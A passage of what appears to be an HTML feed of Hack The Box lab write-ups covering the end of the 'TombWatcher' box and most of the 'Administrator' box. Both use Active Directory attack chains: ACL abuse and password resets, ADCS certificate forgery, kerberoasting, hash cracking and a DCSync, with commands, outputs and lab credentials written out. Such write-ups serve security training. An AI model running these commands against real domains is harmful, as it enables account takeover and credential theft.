+ansible_dev<span class="hljs-variable">$:</span>aes256-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:</span><span class="hljs-number">29</span>a7e3cc3aaad2b30beca182a9707f1a1e71d2eb49a557d50f9fd91360ec2f64
+ansible_dev<span class="hljs-variable">$:</span>aes128-cts-hmac-sha1<span class="hljs-number">-96</span><span class="hljs-symbol">:de6c86d8b6a71c4538f82dc570f7f9a6</span></code></pre></div>
+<p>Then we takeover sam by changing his password.</p>
+<p><img src="/_resources/d5933a689575487ea86158c14b6f0ad9.png" /></p>
+<div><pre class="hljs"><code>└──╼ [★]<span class="hljs-symbol">$</span> bloodyAD --host <span class="hljs-string">'10.129.232.167'</span> -d <span class="hljs-string">'tombwatcher.htb'</span> -u <span class="hljs-string">'ansible_dev$'</span> -p <span class="hljs-string">":7bc5a56af89da4d3c03bc048055350f2"</span> <span class="hljs-keyword">set</span> password <span class="hljs-comment">SAM</span> <span class="hljs-comment">"Password1"</span>
+[+] Password <span class="hljs-comment">changed successfully!</span></code></pre></div>
+<p>Finally we abuse WriteOwner to get to John.</p>
+<p><img src="/_resources/2c2db3aec172492cbea1fbd6419b707e.png" /></p>
+<div><pre class="hljs"><code>└──╼ [★]$ owneredit.py -action <span class="hljs-keyword">write</span> -<span class="hljs-built_in">new</span>-<span class="hljs-keyword">owner</span> <span class="hljs-string">'sam'</span> -target <span class="hljs-string">'john'</span> <span class="hljs-string">'tombwatcher.htb/sam:Password1'</span>
+Impacket v0<span class="hljs-number">.13</span><span class="hljs-number">.0</span>.dev0+<span class="hljs-number">20250130.104306</span><span class="hljs-number">.0</span>f4b866 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies 
+
+[*] <span class="hljs-keyword">Current</span> <span class="hljs-keyword">owner</span> information below
+[*] - SID: S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-1392491010</span><span class="hljs-number">-1358638721</span><span class="hljs-number">-2126982587</span><span class="hljs-number">-512</span>
+[*] - sAMAccountName: <span class="hljs-keyword">Domain</span> Admins
+[*] - distinguishedName: CN=<span class="hljs-keyword">Domain</span> Admins,CN=Users,DC=tombwatcher,DC=htb
+[*] OwnerSid modified successfully!</code></pre></div>
+<p>We took over john but have only genericWrite, so we have to modify our privs. Then we can reset the password and get in using evilwinrm.</p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-4k1brha7vc]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ bloodyAD <span class="hljs-attr">--host</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">232.167</span> -d tombwatcher<span class="hljs-selector-class">.htb</span> -u sam -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'Password1'</span> add genericAll john sam
+<span class="hljs-selector-attr">[+]</span> sam has now GenericAll on john
+┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-4k1brha7vc]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ bloodyAD <span class="hljs-attr">--host</span> <span class="hljs-string">'10.129.232.167'</span> -d <span class="hljs-string">'tombwatcher.htb'</span> -u <span class="hljs-string">'sam'</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">"Password1"</span> set password JOHN <span class="hljs-string">"Password1"</span>
+<span class="hljs-selector-attr">[+]</span> Password changed successfully!</code></pre></div>
+<p><img src="/_resources/fb2e571d104d4357b5ac334804c0d971.png" /></p>
+<p>Looking at “Outbound object control” we see that we can takeover ADCS.</p>
+<p><img src="/_resources/d95c943619b54964a46d973da51a30c5.png" /></p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-selector-attr">[★]</span>$ dacledit<span class="hljs-selector-class">.py</span> -action <span class="hljs-string">'write'</span> -rights <span class="hljs-string">'FullControl'</span> -inheritance -principal <span class="hljs-string">'john'</span> -target-dn <span class="hljs-string">'OU=ADCS,DC=TOMBWATCHER,DC=HTB'</span> <span class="hljs-string">'tombwatcher.htb'</span>/<span class="hljs-string">'john'</span>:<span class="hljs-string">'Password1'</span>
+Impacket v0.<span class="hljs-number">13.0</span>.dev0+<span class="hljs-number">20250130.104306</span>.<span class="hljs-number">0</span>f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+<span class="hljs-selector-attr">[*]</span> NB: objects with adminCount=<span class="hljs-number">1</span> will no <span class="hljs-attribute">inherit</span> ACEs from their parent container/OU
+<span class="hljs-selector-attr">[*]</span> DACL backed up to dacledit-<span class="hljs-number">20250812</span>-<span class="hljs-number">101707</span><span class="hljs-selector-class">.bak</span>
+<span class="hljs-selector-attr">[*]</span> DACL modified successfully!</code></pre></div>
+<p>Knowing the name of the box, we can now check tombstones on the server and find cert_admin accounts. We can reanimate the newest one.</p>
+<div><pre class="hljs"><code><span class="hljs-string">*Evil-WinRM*</span> <span class="hljs-string">PS</span> <span class="hljs-string">C:\Users\john\Documents&gt;</span> <span class="hljs-string">Get-ADObject</span> <span class="hljs-string">-Filter</span> <span class="hljs-string">'isDeleted -eq $true'</span> <span class="hljs-string">-IncludeDeletedObjects</span> <span class="hljs-string">-Properties</span> <span class="hljs-string">*</span>
+<span class="hljs-string">&lt;snip&gt;</span>
+<span class="hljs-attr">CN                              :</span> <span class="hljs-string">cert_admin</span>
+                                  <span class="hljs-string">DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+<span class="hljs-attr">codePage                        :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">countryCode                     :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">Created                         :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:04</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">createTimeStamp                 :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:04</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">Deleted                         :</span> <span class="hljs-literal">True</span>
+<span class="hljs-attr">Description                     :</span>
+<span class="hljs-attr">DisplayName                     :</span>
+<span class="hljs-attr">DistinguishedName               :</span> <span class="hljs-string">CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted</span> <span class="hljs-string">Objects,DC=tombwatcher,DC=htb</span>
+<span class="hljs-attr">dSCorePropagationData           :</span> {<span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:10</span> <span class="hljs-string">PM</span>, <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:08</span> <span class="hljs-string">PM</span>, <span class="hljs-number">12</span><span class="hljs-string">/31/1600</span> <span class="hljs-number">7</span><span class="hljs-string">:00:00</span> <span class="hljs-string">PM</span>}
+<span class="hljs-attr">givenName                       :</span> <span class="hljs-string">cert_admin</span>
+<span class="hljs-attr">instanceType                    :</span> <span class="hljs-number">4</span>
+<span class="hljs-attr">isDeleted                       :</span> <span class="hljs-literal">True</span>
+<span class="hljs-attr">LastKnownParent                 :</span> <span class="hljs-string">OU=ADCS,DC=tombwatcher,DC=htb</span>
+<span class="hljs-attr">lastLogoff                      :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">lastLogon                       :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">logonCount                      :</span> <span class="hljs-number">0</span>
+<span class="hljs-attr">Modified                        :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:27</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">modifyTimeStamp                 :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:27</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">msDS-LastKnownRDN               :</span> <span class="hljs-string">cert_admin</span>
+<span class="hljs-attr">Name                            :</span> <span class="hljs-string">cert_admin</span>
+                                  <span class="hljs-string">DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+<span class="hljs-attr">nTSecurityDescriptor            :</span> <span class="hljs-string">System.DirectoryServices.ActiveDirectorySecurity</span>
+<span class="hljs-attr">ObjectCategory                  :</span>
+<span class="hljs-attr">ObjectClass                     :</span> <span class="hljs-string">user</span>
+<span class="hljs-attr">ObjectGUID                      :</span> <span class="hljs-string">938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+<span class="hljs-attr">objectSid                       :</span> <span class="hljs-string">S-1-5-21-1392491010-1358638721-2126982587-1111</span>
+<span class="hljs-attr">primaryGroupID                  :</span> <span class="hljs-number">513</span>
+<span class="hljs-attr">ProtectedFromAccidentalDeletion :</span> <span class="hljs-literal">False</span>
+<span class="hljs-attr">pwdLastSet                      :</span> <span class="hljs-number">133762504248946345</span>
+<span class="hljs-attr">sAMAccountName                  :</span> <span class="hljs-string">cert_admin</span>
+<span class="hljs-attr">sDRightsEffective               :</span> <span class="hljs-number">7</span>
+<span class="hljs-attr">sn                              :</span> <span class="hljs-string">cert_admin</span>
+<span class="hljs-attr">userAccountControl              :</span> <span class="hljs-number">66048</span>
+<span class="hljs-attr">uSNChanged                      :</span> <span class="hljs-number">13197</span>
+<span class="hljs-attr">uSNCreated                      :</span> <span class="hljs-number">13186</span>
+<span class="hljs-attr">whenChanged                     :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:27</span> <span class="hljs-string">PM</span>
+<span class="hljs-attr">whenCreated                     :</span> <span class="hljs-number">11</span><span class="hljs-string">/16/2024</span> <span class="hljs-number">12</span><span class="hljs-string">:07:04</span> <span class="hljs-string">PM</span>
+
+
+<span class="hljs-string">Restore-ADObject</span> <span class="hljs-string">-Identity</span> <span class="hljs-string">938182c3-bf0b-410a-9aaa-45c8e1a02ebf</span>
+<span class="hljs-string">Enable-ADAccount</span> <span class="hljs-string">-Identity</span> <span class="hljs-string">cert_admin</span></code></pre></div>
+<p>We have genericAll over this new user, so time to reset his password with <code>Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force)</code>.</p>
+<p><img src="/_resources/23642354335a412a9a3ad05904cfca37.png" /></p>
+<p>Now that we have cert_admin, time to look at certs that he menages.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ certipy-ad <span class="hljs-built_in">find</span> -u cert_admin@tombwatcher.htb -p Password1 -dc-ip 10.129.232.167
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">'tombwatcher-CA-1'</span> via CSRA
+[!] Got <span class="hljs-built_in">error</span> <span class="hljs-keyword">while</span> trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">'tombwatcher-CA-1'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">'tombwatcher-CA-1'</span> via RRP
+[!] Failed <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> remote registry.<span class="hljs-built_in"> Service </span>should be starting now. Trying again<span class="hljs-built_in">..</span>.
+[*] Got CA configuration <span class="hljs-keyword">for</span> <span class="hljs-string">'tombwatcher-CA-1'</span>
+[*] Saved BloodHound data <span class="hljs-keyword">to</span> <span class="hljs-string">'20250812105044_Certipy.zip'</span>. Drag <span class="hljs-keyword">and</span> drop the file into the BloodHound GUI <span class="hljs-keyword">from</span> @ly4k
+[*] Saved text output <span class="hljs-keyword">to</span> <span class="hljs-string">'20250812105044_Certipy.txt'</span>
+[*] Saved JSON output <span class="hljs-keyword">to</span> <span class="hljs-string">'20250812105044_Certipy.json'</span></code></pre></div>
+<p>We find some ESC codes.</p>
+<p><img src="/_resources/6c1b6eec017d4d57b1a3c9d32ee2718f.png" /></p>
+<p>We check with the wiki.</p>
+<p><a title="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation" href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation">https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation</a></p>
+<div><pre class="hljs"><code>certipy-ad req -u <span class="hljs-symbol">'cert_admin</span><span class="hljs-meta">@tombwatcher</span>.htb' -p <span class="hljs-symbol">'Password</span>1' -dc-ip <span class="hljs-symbol">'10</span><span class="hljs-number">.129</span><span class="hljs-number">.232</span><span class="hljs-number">.167</span>' -target <span class="hljs-symbol">'DC01</span>.tombwatcher.htb' -ca <span class="hljs-symbol">'tombwatcher</span>-<span class="hljs-type">CA</span><span class="hljs-number">-1</span>' -template <span class="hljs-symbol">'WebServe</span>r' -upn <span class="hljs-symbol">'administrator</span><span class="hljs-meta">@tombwatcher</span>.htb' -application-policies <span class="hljs-symbol">'Client</span> <span class="hljs-type">Authentication</span>'
+
+certipy-ad auth -pfx <span class="hljs-symbol">'administrator</span>.pfx' -dc-ip <span class="hljs-symbol">'10</span><span class="hljs-number">.129</span><span class="hljs-number">.232</span><span class="hljs-number">.167</span>' -ldap-shell</code></pre></div>
+<p>We can then change password for admin.</p>
+<p><img src="/_resources/fd1ac01ad6e7418c8f15bced5cf3e7f9.png" /></p>
+<p>Then we can login into admin using evilwin-rm</p>
+<p><img src="/_resources/2a492e8b1b284225a5ea5150a46f49c2.png" /></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Windows - Medium - Administrator]]></title>
+            <guid>d98c3504c1374bbe81b257c02327d06f</guid>
+            <pubDate>Mon, 11 Aug 2025 14:07:23 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p>Quick nmap finds domain <code>administrator.htb</code> , ftp, kerberos</p>
+<div><pre class="hljs"><code>PORT      STATE SERVICE       VERSION
+<span class="hljs-number">21</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  ftp           Microsoft ftpd
+<span class="hljs-operator">|</span> ftp<span class="hljs-operator">-</span>syst: 
+<span class="hljs-operator">|</span>_  SYST: Windows_NT
+<span class="hljs-number">53</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  domain        Simple DNS Plus
+<span class="hljs-number">88</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  kerberos<span class="hljs-operator">-</span>sec  Microsoft Windows Kerberos (server <span class="hljs-type">time</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-11</span> <span class="hljs-number">21</span>:<span class="hljs-number">17</span>:<span class="hljs-number">33</span>Z)
+<span class="hljs-number">135</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">139</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  netbios<span class="hljs-operator">-</span>ssn   Microsoft Windows netbios<span class="hljs-operator">-</span>ssn
+<span class="hljs-number">389</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)
+<span class="hljs-number">445</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  microsoft<span class="hljs-operator">-</span>ds?
+<span class="hljs-number">464</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  kpasswd5?
+<span class="hljs-number">593</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  tcpwrapped
+<span class="hljs-number">3268</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)
+<span class="hljs-number">3269</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  tcpwrapped
+<span class="hljs-number">5985</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>title: <span class="hljs-keyword">Not</span> Found
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>server<span class="hljs-operator">-</span>header: Microsoft<span class="hljs-operator">-</span>HTTPAPI<span class="hljs-operator">/</span><span class="hljs-number">2.0</span>
+<span class="hljs-number">9389</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  mc<span class="hljs-operator">-</span>nmf        .NET Message Framing
+<span class="hljs-number">47001</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>title: <span class="hljs-keyword">Not</span> Found
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>server<span class="hljs-operator">-</span>header: Microsoft<span class="hljs-operator">-</span>HTTPAPI<span class="hljs-operator">/</span><span class="hljs-number">2.0</span>
+<span class="hljs-number">49664</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49665</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49666</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49667</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49668</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53151</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53158</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">53163</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53166</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53186</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53219</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+Device type: general purpose<span class="hljs-operator">|</span>specialized
+<span class="hljs-keyword">Running</span> (JUST GUESSING): Microsoft Windows <span class="hljs-number">2022</span><span class="hljs-operator">|</span><span class="hljs-number">2012</span><span class="hljs-operator">|</span><span class="hljs-number">11</span><span class="hljs-operator">|</span><span class="hljs-number">2016</span><span class="hljs-operator">|</span><span class="hljs-number">2019</span><span class="hljs-operator">|</span><span class="hljs-number">10</span> (<span class="hljs-number">91</span><span class="hljs-operator">%</span>)</code></pre></div>
+<p>We can then run scan with bloodhound.py and import it into bloodhound.</p>
+<p><code>python3 bloodhound.py -d administrator.htb -c All -u olivia -p 'ichliebedich' -ns $ip -k</code></p>
+<h1 id="foothold">Foothold</h1>
+<p>We can see that olivia has GenericAll privs over michael. The <a title="https://bloodhound.specterops.io/resources/edges/generic-all#genericall" href="https://bloodhound.specterops.io/resources/edges/generic-all#genericall">manual for bloodhound</a> is helpful here.</p>
+<p><img src="/_resources/51b50c10aad047ac8753eac5c10b0a78.png" /></p>
+<p>There is also built in help.</p>
+<p><img src="/_resources/5db1c612d1f3478ab46f41e73bb2e4f0.png" /></p>
+<p>We can then change michael’s password with <code>net user michael Password1 /domain</code>.</p>
+<p><img src="/_resources/f94600cf030445a581302c8b1b685e64.png" /></p>
+<p>We can then mark Michael as pwned and see what priv’s he has. We can then change password for benjamin the same way.</p>
+<div><pre class="hljs"><code><span class="hljs-built_in">Import-Module</span> ActiveDirectory
+<span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">'Password1'</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>
+<span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">'ADMINISTRATOR\michael'</span>, <span class="hljs-variable">$SecPassword</span>)
+<span class="hljs-variable">$UserPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">'Password1'</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>
+<span class="hljs-built_in">Set-ADAccountPassword</span> <span class="hljs-literal">-Identity</span> benjamin <span class="hljs-literal">-NewPassword</span> (<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">'Password1'</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-literal">-Reset</span> <span class="hljs-literal">-Server</span> administrator.htb <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span></code></pre></div>
+<p>Then in Bloodhound we can see that benjamin is one of the share moderators.</p>
+<p><img src="/_resources/5768fe3fa4f24a41a4ddc1dcee5cfa77.png" /></p>
+<p><img src="/_resources/514585612f084ab59e49675419923513.png" /></p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-selector-attr">[★]</span>$ file Backup<span class="hljs-selector-class">.psafe3</span> 
+Backup<span class="hljs-selector-class">.psafe3</span>: Password Safe V3 database</code></pre></div>
+<p>We can crack it with hashcat and get password <code>tekieromucho</code>.</p>
+<p><img src="/_resources/d5eef154b72b4e91bd80b33c5fbc0d7d.png" /></p>
+<p>After opening the database, we get new creds.</p>
+<p><img src="/_resources/05c4ddae238749ff8a5d042c7018aedf.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-attribute">alexander</span> UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+emily UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+emma WwANQWnmJnGV07WQN8bMS7FMAbjNur</code></pre></div>
+<p>We can check if they are valid with <code>netexec smb 10.129.201.124 -u user.txt -p pass.txt</code>.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-selector-attr">[★]</span>$ netexec smb <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span> -u users<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> pass<span class="hljs-selector-class">.txt</span>
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[*]</span> Windows Server <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[+]</span> administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb </code></pre></div>
+<p>We finally get to log in as emily and get user flag.</p>
+<p><code>evil-winrm -i 10.129.201.124 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>We can go kerberoasting.</p>
+<p><img src="/_resources/e312cebc766d4c17a2aac5b8c8b85385.png" /></p>
+<p><img src="/_resources/f9be8af778934cb6bdecbd9ad0d7da7e.png" /></p>
+<p>We dont have to execute this manualy, ready-to-go scripts are availeable.<br />
+<a title="https://github.com/ShutdownRepo/targetedKerberoast" href="https://github.com/ShutdownRepo/targetedKerberoast">https://github.com/ShutdownRepo/targetedKerberoast</a></p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-6owi1lm3xr]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ python3 targetedKerberoast<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dc-ip</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span> -d administrator<span class="hljs-selector-class">.htb</span> -u emily -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'</span> -U ethan<span class="hljs-selector-class">.txt</span>
+<span class="hljs-selector-attr">[*]</span> Starting kerberoast attacks
+<span class="hljs-selector-attr">[*]</span> Fetching usernames from file
+<span class="hljs-selector-attr">[!]</span> Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code></pre></div>
+<p>We can fix the clock error running <code>sudo ntpdate 10.129.201.124</code></p>
+<p><code>python3 targetedKerberoast.py --dc-ip 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt</code></p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-6owi1lm3xr]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ python3 targetedKerberoast<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dc-ip</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span> -d administrator<span class="hljs-selector-class">.htb</span> -u emily -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'</span> -U ethan<span class="hljs-selector-class">.txt</span>
+<span class="hljs-selector-attr">[*]</span> Starting kerberoast attacks
+<span class="hljs-selector-attr">[*]</span> Fetching usernames from file
+<span class="hljs-selector-attr">[+]</span> Printing hash <span class="hljs-keyword">for</span> (ethan)
+<span class="hljs-variable">$krb5tgs</span>$<span class="hljs-number">23</span>$*ethan<span class="hljs-variable">$ADMINISTRATOR</span>.HTB<span class="hljs-variable">$administrator</span>.htb/ethan*<span class="hljs-variable">$bce085abb60d</span>&lt;snip&gt;ebf04e96810e5089af19b7e5aabf84bcc4382f67fafb06ff77a236d9a321fc68ebc258efb</code></pre></div>
+<p>We can then again crack it with <code>hashcat -a 0 -m 13100 ethan /usr/share/wordlists/rockyou.txt.gz</code>. -&gt; password: <code>limpbizkit</code>.</p>
+<p><img src="/_resources/12078b9717c54e02a48fc9dbe0d47356.png" /></p>
+<p>We can perform a dcsync attack.</p>
+<p><img src="/_resources/6e36af65694844d4ab1c475ef7a83343.png" /></p>
+<div><pre class="hljs"><code>└──╼ [★]$ secretsdump.py -just-dc ADMINISTRATOR.HTB/ethan@<span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>
+Impacket v0.<span class="hljs-number">13.0</span>.dev0+<span class="hljs-number">20250130.104306</span>.<span class="hljs-number">0</span>f4b866 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies 
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] <span class="hljs-keyword">Using</span> the DRSUAPI <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">to</span> <span class="hljs-title">get</span> <span class="hljs-title">NTDS</span>.<span class="hljs-title">DIT</span> <span class="hljs-title">secrets</span>
